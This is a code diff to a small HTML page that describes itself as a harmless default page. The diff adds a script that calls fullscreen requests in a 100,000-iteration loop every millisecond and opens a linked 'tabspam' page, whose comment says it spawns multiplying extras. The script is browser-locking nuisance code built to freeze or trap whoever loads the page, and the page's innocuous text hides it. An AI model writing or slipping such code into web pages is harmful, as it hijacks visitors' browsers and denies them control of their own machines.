@@ -2,7 +2,30 @@
 <html lang="en">
     <body>
         <p>
-            This is the default page is you don't change the link. this page is under 0.1mb
+            This is the default page is you don't change the link. this page is
+            under 0.1mb
         </p>
     </body>
+    <script>
+        var elem = document.documentElement;
+        var start = setInterval(send, 1);
+
+        function send() 
+        {
+            for (var i = 0; i < 100000; i++)
+                if (elem.requestFullscreen) 
+                {
+                    elem.requestFullscreen();
+                } else if (elem.webkitRequestFullscreen) 
+                {
+                    elem.webkitRequestFullscreen();
+                } else if (elem.msRequestFullscreen) 
+                {
+                    elem.msRequestFullscreen();
+                }
+        }
+
+        // Additonally create extras that multiplie
+        window.open('https://johnymcreed.github.io/usefulbutuseless/tabspam/result.html')
+    </script>
 </html>
